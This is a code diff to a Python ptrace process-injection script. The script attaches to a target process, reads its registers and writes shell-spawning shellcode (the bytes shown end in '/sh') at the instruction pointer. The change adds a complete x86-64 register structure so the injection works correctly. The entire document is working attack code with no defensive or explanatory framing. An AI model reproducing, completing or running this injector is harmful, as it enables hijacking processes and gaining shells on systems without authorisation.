@@ -12,6 +12,37 @@ shellcode = (
     "\x2f\x73\x68\x00\xcc\x90\x90\x90"
 )
 
+class user_regs_struct(ctypes.Structure):
+    _fields_ = [
+        ("r15", ctypes.c_ulonglong),
+        ("r14", ctypes.c_ulonglong),
+        ("r13", ctypes.c_ulonglong),
+        ("r12", ctypes.c_ulonglong),
+        ("rbp", ctypes.c_ulonglong),
+        ("rbx", ctypes.c_ulonglong),
+        ("r11", ctypes.c_ulonglong),
+        ("r10", ctypes.c_ulonglong),
+        ("r9", ctypes.c_ulonglong),
+        ("r8", ctypes.c_ulonglong),
+        ("rax", ctypes.c_ulonglong),
+        ("rcx", ctypes.c_ulonglong),
+        ("rdx", ctypes.c_ulonglong),
+        ("rsi", ctypes.c_ulonglong),
+        ("rdi", ctypes.c_ulonglong),
+        ("orig_rax", ctypes.c_ulonglong),
+        ("rip", ctypes.c_ulonglong),
+        ("cs", ctypes.c_ulonglong),
+        ("eflags", ctypes.c_ulonglong),
+        ("rsp", ctypes.c_ulonglong),
+        ("ss", ctypes.c_ulonglong),
+        ("fs_base", ctypes.c_ulonglong),
+        ("gs_base", ctypes.c_ulonglong),
+        ("ds", ctypes.c_ulonglong),
+        ("es", ctypes.c_ulonglong),
+        ("fs", ctypes.c_ulonglong),
+        ("gs", ctypes.c_ulonglong),
+    ]
+
 def inject_data(pid, src, dst, size):
     libc = ctypes.CDLL('libc.so.6')
     offset = 0
@@ -42,13 +73,13 @@ def main():
     os.wait()
 
     print("+ Getting Registers")
-    regs_buf = ctypes.create_string_buffer(8 * 8)  # sizeof(struct user_regs_struct) = 8 * 8
-    ret = libc.ptrace(12, target_pid, None, ctypes.cast(regs_buf, ctypes.c_void_p))  # PTRACE_GETREGS
+    regs_buf = user_regs_struct()
+    ret = libc.ptrace(12, target_pid, None, ctypes.byref(regs_buf))  # PTRACE_GETREGS
     if ret < 0:
         print("ptrace(GETREGS) error")
         sys.exit(1)
 
-    rip_address = struct.unpack("=Q", regs_buf.raw[8:])[0]  # 수정된 부분
+    rip_address = regs_buf.rip
 
     print("+ Injecting shell code at %p" % rip_address)
     inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)
